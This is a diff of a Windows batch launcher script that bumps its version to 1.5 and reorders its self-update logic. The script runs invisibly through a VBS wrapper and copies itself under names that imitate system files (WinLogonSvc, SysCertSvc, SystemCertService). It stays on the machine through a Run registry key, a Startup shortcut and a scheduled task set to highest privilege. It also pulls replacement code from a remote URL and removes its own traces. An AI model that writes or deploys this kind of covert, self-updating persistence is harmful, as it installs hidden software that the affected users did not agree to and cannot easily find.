@@ -1,4 +1,5 @@
-set "LAUNCHER_VERSION=1.4"
+@echo off
+set "LAUNCHER_VERSION=1.5"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"
 
@@ -7,19 +8,7 @@ set "workerScriptPath=%secretPath%\restore_worker.bat"
 set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"
 set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"
 
-curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
-if exist "%secretPath%\lv.tmp" (
-    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
-    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
-    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
-        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
-        if exist "%launcherScriptPath%.new" (
-            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
-            start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
-            goto :eof
-        )
-    )
-)
+start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
 
 set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
@@ -49,12 +38,23 @@ if not exist "%shortcutPath%" (
 
 schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
 
-start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
+curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
+if exist "%secretPath%\lv.tmp" (
+    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
+    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
+    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
+        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
+        if exist "%launcherScriptPath%.new" (
+            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
+            start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
+            goto :eof
+        )
+    )
+)
 
 :eof
 endlocal
 exit /b
 
-set "logPath=%LOCALAPPDATA%\Microsoft\SystemCertificates\WinLogonSvc.log"
-echo %DATE% %TIME% - WinLogonSvc executado. >> "%logPath%"
+
 
